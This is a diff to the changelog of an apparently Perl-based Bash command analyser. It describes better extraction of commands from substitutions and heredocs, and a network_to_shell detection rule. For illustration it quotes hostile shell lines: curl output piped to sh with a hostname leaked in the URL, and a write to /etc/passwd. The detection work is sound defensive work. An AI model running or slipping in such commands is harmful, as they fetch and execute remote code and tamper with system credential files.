@@ -1,5 +1,25 @@
 {{$NEXT}}
 
+  - commands() returns a command wherever Bash executes one. Commands
+    in $(...), backticks and <(...) / >(...) are extracted from
+    assignments (x=$(cmd), prefix assignments X=$(cmd) command, arrays,
+    subscripts), export / declare / local / readonly / typeset / unset,
+    [ ], [[ ]] and (( )), the command word ($(cmd) arg), redirect
+    targets and herestrings (> $(cmd), < <(cmd), <<< "$(cmd)") and
+    heredoc bodies with an unquoted delimiter - in addition to
+    arguments, case and parameter expansions. The pipeline or list
+    behind a heredoc operator (cat <<EOF | sh, cat <<EOF && cmd) is
+    extracted with before_op / after_op set. findings() and the
+    Security::Checker rules see all of these
+  - before_op / after_op connect commands of the same level, and a
+    redirect is recorded on the command it belongs to; neither ends up
+    on a command substituted inside that command
+    (echo $(id) > /etc/passwd: the redirect is on echo)
+  - network_to_shell also fires when a substitution sits between the
+    fetcher and the pipe (curl "http://x/$(hostname)" | sh,
+    X=$(id) curl http://x | sh)
+  - POD: new LIMITATIONS section listing the substitutions the 0.20.5
+    grammar does not parse and the walker therefore cannot reach
   - Source tree-sitter cannot parse is reported instead of passing as
     harmless. findings() appends one `parse_error` finding per
     unparsable region (unterminated quote, `$(` without `)`, stray
